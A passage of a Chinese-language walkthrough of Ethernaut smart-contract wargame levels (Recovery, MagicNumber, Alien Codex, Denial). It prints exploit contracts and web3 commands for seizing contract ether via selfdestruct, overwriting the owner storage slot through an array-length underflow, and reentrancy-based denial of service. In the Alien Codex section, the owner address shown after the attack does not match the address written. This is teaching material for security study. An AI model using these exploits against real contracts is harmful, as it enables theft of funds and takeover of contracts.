之后获取合约地址  
之后部署攻击合约：  
之后见合约的address作为产生传入hack中实施攻击：  
之后再次查看合约的"unlocked"的状态值，发现已经发生了变化，改为了"true"  
最后提交示例即可：  
#### Recovery
##### 闯关条件
合约的创建者已经构建了一个非常简单的合约示例。任何人都可以轻松地创建新的代币。部署第一个令牌合约后，创建者发送了0.5ether以获取更多token。后来他们失去了合同地址。
如果您可以从丢失的合同地址中恢复（或移除）0.5ether，则此级别将完成。
##### 合约代码
    pragma solidity ^0.4.23;
    import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
    contract Recovery {
      //generate tokens
      function generateToken(string _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
      }
    }
    contract SimpleToken {
      using SafeMath for uint256;
      // public variables
      string public name;
      mapping (address => uint) public balances;
      // constructor
      constructor(string _name, address _creator, uint256 _initialSupply) public {
        name = _name;
        balances[_creator] = _initialSupply;
      }
      // collect ether in return for tokens
      function() public payable {
        balances[msg.sender] = msg.value.mul(10);
      }
      // allow transfers of tokens
      function transfer(address _to, uint _amount) public { 
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = _amount;
      }
      // clean up after ourselves
      function destroy(address _to) public {
        selfdestruct(_to);
      }
    }
##### 合约分析
由于在链上所有东西都是透明的，因此合约创建时我们直接查看合约就可以查看到新建立的合约的地址。之后如果要回复token可以借助destory函数来实现，可以构建如下EXP:
    pragma solidity ^0.4.23;
    contract SimpleToken {
      // public variables
      string public name;
      mapping (address => uint) public balances;
      // collect ether in return for tokens
      function() public payable ;
      // allow transfers of tokens
      function transfer(address _to, uint _amount) public ;
      // clean up after ourselves
      function destroy(address _to) public ;
    }
    contract RecoveryPoc {
        SimpleToken target;
        constructor(address _addr) public{
            target = SimpleToken(_addr);
        }
        function attack() public{
            target.destroy(tx.origin);
        }
    }
##### 攻击流程
首先获取一个实例  
从MetaMask上获取交易细节信息  
由此确定新合约的地址：  
之后部署攻击合约  
之后点击hack实施攻击：  
之后查看attack之后的交易细节，发现代币找回  
同时发现新合约自动销毁  
最后点击"submit instance"提交示例即可：  
#### MagicNumber
##### 闯关条件
要解决这个级别，您只需要向etranaut提供一个“Solver”，这是一个响应“whatistMeaningoflife()”的契约，并提供正确的数字。
很容易吧？好。。。有个陷阱。 解算器的代码需要非常小。真的很小。就像怪物真的有点小：最多10个操作码。
提示：也许是时候暂时离开Solidity编译器的舒适性，手工构建这个编译器了。没错：原始EVM字节码。 祝你好运！  
即要求输出42(操作码为2A)。
##### 合约代码
    pragma solidity ^0.4.24;
    contract MagicNum {
      address public solver;
      constructor() public {}
      function setSolver(address _solver) public {
        solver = _solver;
      }
      /*
        ____________/\\\_______/\\\\\\\\\_____        
         __________/\\\\\_____/\\\///////\\\___       
          ________/\\\/\\\____\///______\//\\\__      
           ______/\\\/\/\\\______________/\\\/___     
            ____/\\\/__\/\\\___________/\\\//_____    
             __/\\\\\\\\\\\\\\\\_____/\\\//________   
              _\///////////\\\//____/\\\/___________  
               ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
                ___________\///_____\///////////////__
      */
    }
##### 合约分析
对于操作码的执行我们需要用转账函数：
    web3.eth.sendTransaction({from:player,data:bytecode},function(err,res){console.log(res)})
这里借鉴了一个writeup(
    var bytecode = "0x600a600c600039600a6000f3602A60805260206080f3"; 
    web3.eth.sendTransaction({from:player, data:bytecode}, function(err,res){console.log(res)}); 
    await contract.setSolver("0xccb446cbcd073320dfb8487cfcab02aeeb0aeee6");
##### 攻击流程
获取一个实例：  
之后在控制台实施攻击  
最后点击“submit instance”提交示例：  
#### Alien Codex
###### 闯关条件
获取合约的所有权。
##### 合约代码
    pragma solidity ^0.4.24;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract AlienCodex is Ownable {
      bool public contact;
      bytes32[] public codex;
      modifier contacted() {
        assert(contact);
        _;
      }
      function make_contact(bytes32[] _firstContactMessage) public {
        assert(_firstContactMessage.length > 2**200);
        contact = true;
      }
      function record(bytes32 _content) contacted public {
        codex.push(_content);
      }
      function retract() contacted public {
        codex.length--;
      }
      function revise(uint i, bytes32 _content) contacted public {
        codex[i] = _content;
      }
    }
##### 合约分析
合约开头 import 了 Ownable 合约，同时也引入了一个 owner 变量。
    web3.eth.getStorageAt(contract.address, 0, function(x, y) {alert(y)});
    // 0x00000000000000000000000073048cec9010e92c298b016966bde1cc47299df5
    // bool public contact   0x000000000000000000000000
    // address public owner  0x73048cec9010e92c298b016966bde1cc47299df5
由于 EVM 存储优化的关系，在 slot [0]中同时存储了contact和owner，需要做的就是将owner变量覆盖为自己。  
首先通过 make_contact() 函数，我们可以将contact变量设置为 true，这也是调用其他几个函数的前提。  
在make_contact() 函数中，我们需要传入一个长度大于 2^200 的数组。如果直接在 remix 上部署一个合约来传，会发现 gas
消耗爆炸了。明显这是不太现实的，需要绕过。 由于 make_contact() 函数只验证传入数组的长度。了解到 OPCODE
中数组长度是存储在某个slot上的，并且没有对数组长度和数组内的数据做校验。所以可以构造一个存储位上长度很大，但实际上并没有数据的数组，打包成data
发送。
    sig = web3.sha3("make_contact(bytes32[])").slice(0,10)
    // "0x1d3d4c0b"
    // 函数选择器
    data1 = "0000000000000000000000000000000000000000000000000000000000000020"
    // 除去函数选择器，数组长度的存储从第 0x20 位开始
    data2 = "1000000000000000000000000000000000000000000000000000000000000001"
    // 数组的长度
    await contract.contact()
    // false
    contract.sendTransaction({data: sig + data1 + data2});
    // 发送交易
    await contract.contact()
    // true
之后就是一个经典的 OOB (out of boundary) Attack  
首先通过调用 retract()，使得 codex 数组长度下溢。
    web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(y)});
    // codex.length
    // 0x0000000000000000000000000000000000000000000000000000000000000000
    contract.retract()
    // codex.length--    
    web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(y)});
    // codex.length
    // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
而在Solidity中动态数组内变量的存储位计算方法可以概括为：  
b[X] == SLOAD(keccak256(slot) + X)  
在本题中，数组 codex 的 slot 为 1，同时也是存储数组长度的地方。
    >>> import sha3
    >>> import binascii
    >>> def bytes32(i):
    >>>     return binascii.unhexlify('%064x'%i)
    >>> sha3.keccak_256(bytes32(1)).hexdigest()
    'b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'
    >>> 2**256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    35707666377435648211887908874984608119992236509074197713628505308453184860938
可计算出，codex[35707666377435648211887908874984608119992236509074197713628505308453184860938]
对应的存储位就是 slot 0。 之前提到 slot 0 中同时存储了 contact 和 owner，只需将 owner 替换为 player 地址即可。
    await contract.owner()
    // "0x73048cec9010e92c298b016966bde1cc47299df5"
    contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x000000000000000000000001a61cfd1573fd2207dcb1841cedcb1d5aed4dc155')
    // 调用 revise()
    await contract.owner()
    // "0x676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf"
    // Submit instance
##### 攻击流程
获取一个新的实例：  
中间流程参考合约分析部分！最后获得owner之后提交示例即可：  
#### Denial
##### 闯关要求
造成DOS使得合约的owner在调用withdraw时无法正常提取资产。
##### 合约代码
    pragma solidity ^0.4.24;
    import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
    contract Denial {
        using SafeMath for uint256;
        address public partner; // withdrawal partner - pay the gas, split the withdraw
        address public constant owner = 0xA9E;
        uint timeLastWithdrawn;
        mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
        function setWithdrawPartner(address _partner) public {
            partner = _partner;
        }
        // withdraw 1% to recipient and 1% to owner
        function withdraw() public {
            uint amountToSend = address(this).balance.div(100);
            // perform a call without checking return
            // The recipient can revert, the owner will still get their share
            partner.call.value(amountToSend)();
            owner.transfer(amountToSend);
            // keep track of last withdrawal time
            timeLastWithdrawn = now;
            withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
        }
        // allow deposit of funds
        function() payable {}
        // convenience function
        function contractBalance() view returns (uint) {
            return address(this).balance;
        }
    }
##### 合约分析
从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner
自然收不到钱了，从而造成DOS。
攻击合约如下：
    pragma solidity ^0.4.23;
    contract Denial {
        address public partner; // withdrawal partner - pay the gas, split the withdraw
        address public constant owner = 0xA9E;
        uint timeLastWithdrawn;
        mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
        function setWithdrawPartner(address _partner) public {
            partner = _partner;
        }
        // withdraw 1% to recipient and 1% to owner
        function withdraw() public {
            uint amountToSend = address(this).balance/100;
            // perform a call without checking return
            // The recipient can revert, the owner will still get their share
            partner.call.value(amountToSend)();
            owner.transfer(amountToSend);
            // keep track of last withdrawal time
            timeLastWithdrawn = now;
            withdrawPartnerBalances[partner] += amountToSend;
        }
        // allow deposit of funds
        function() payable {}
        // convenience function
        function contractBalance() view returns (uint) {
            return address(this).balance;
        }
    }
    contract Attack{
        address instance_address = instance_address_here;//根据示例来更改该参数
        Denial target = Denial(instance_address);
        function hack() public {
            target.setWithdrawPartner(address(this));
            target.withdraw();
        }
        function () payable public {
            target.withdraw();
        } 
    }
##### 攻击流程
获取一个实例  
之后查看instance的地址  
之后部署攻击合约  
之后点击"Hack"实施攻击即可：  
最后提交示例即可  
#### Shop
该关卡目前已经关闭了——404：  
### 总结
智能合约的安全性在开发时需要注重逻辑的设计、函数的调用、底层存储机制等安全问题，而我们在审计过程中也需要多多注意各种潜在的安全风险。
感觉多少有点费劲，上下篇文章每篇文章图片就70——90，心累，心累，，，不过还好是坚持这写完了，在写作过程中深深感悟到————“实践是检验真理的唯一标准”，如果各位读者有兴趣的话不妨自我动手操作一下看看，必定获益匪浅~
### 参考资料